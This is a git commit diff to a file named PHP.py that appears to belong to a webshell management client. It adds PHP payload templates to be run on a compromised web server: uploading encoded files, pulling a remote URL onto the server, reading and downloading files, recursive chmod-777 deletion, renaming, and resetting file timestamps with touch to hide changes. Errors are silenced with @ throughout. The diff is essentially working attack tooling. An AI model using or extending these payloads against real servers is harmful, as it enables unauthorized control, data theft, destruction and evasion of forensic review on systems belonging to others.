8faa0c6cc55a2b37db9525ad8fbb8b5097a6aacf
liangzhibang <liangzhibang@live.com>
2018-05-31 15:34:19 +0800

    Update PHP.py

--- PHP.py
+++ PHP.py
@@ -21,4 +21,12 @@ BASE_INFO = """$D=dirname(__FILE__);$R="{$D}\t";if(substr($D,0,1)!="/"){foreach(
     LeftDelimiter, RightDelimiter)
 SHOW_FOLDER = """$D='%s';$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.'/'.$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R="\t".$T."\t".@filesize($P)."\t".$E."\n";if(@is_dir($P))$M.="T\t".$P.$R;else $L.="F\t".$P.$R;}echo """ + """ "%s".$M.$L."%s";@closedir($F);}""" % (
     LeftDelimiter, RightDelimiter)
-READ_FILE = """$F='%s';$P=@fopen($F,'r');echo "{0}";echo(@fread($P,filesize($F)));echo "{1}";@fclose($P);""".format(LeftDelimiter,RightDelimiter)
+READ_FILE = """$F='%s';$P=@fopen($F,'r');echo "{0}";echo(@fread($P,filesize($F)));echo "{1}";@fclose($P);""".format(
+    LeftDelimiter, RightDelimiter)
+UPLOAD_FILE = """$f='%s';$c=$_POST["file"];echo ">>>";echo(@fwrite(fopen($f,'w'),gzuncompress(base64_decode($c)))?'1':'0');echo "<<<";"""
+WGET_FILE = """$fR='%s';$fL='%s';$F=@fopen($fR,chr(114));$L=@fopen($fL,chr(119));if($F && $L){while(!feof($F))@fwrite($L,@fgetc($F));@fclose($F);@fclose($L);echo(">>>1<<<");}else{echo(">>>0<<<");}"""
+DOWNLOAD_FILE = """$F="%s";$fp=@fopen($F,'r');if(@fgetc($fp)){@fclose($fp);@readfile($F);}else{echo('ERROR:// Can Not Read');}"""
+RENAME = """$src='%s';$dst='%s';echo ">>>";echo rename($src,$dst)?'1':'0';echo "<<<";"""
+DELETE = """$F='%s';function df($p){$m=@dir($p);while(@$f=$m->read()){$pf=$p."/".$f;if((is_dir($pf))&&($f!=".")&&($f!="..")){@chmod($pf,0777);df($pf);}if(is_file($pf)){@chmod($pf,0777);@unlink($pf);}}$m->close();@chmod($p,0777);return @rmdir($p);}if(is_dir($F))echo(df($F));else{echo(file_exists($F)?@unlink($F)?">>>1<<<":">>>0<<<":">>>0<<<");}"""
+NEW_FOLDER = """$f='%s';echo(mkdir($f)?">>>1<<<":">>>0<<<");"""
+SET_TIME = """$FN='%s';$TM=strtotime('%s');if(file_exists($FN)){echo(@touch($FN,$TM,$TM)?'1':'0');}else{echo '0';};"""
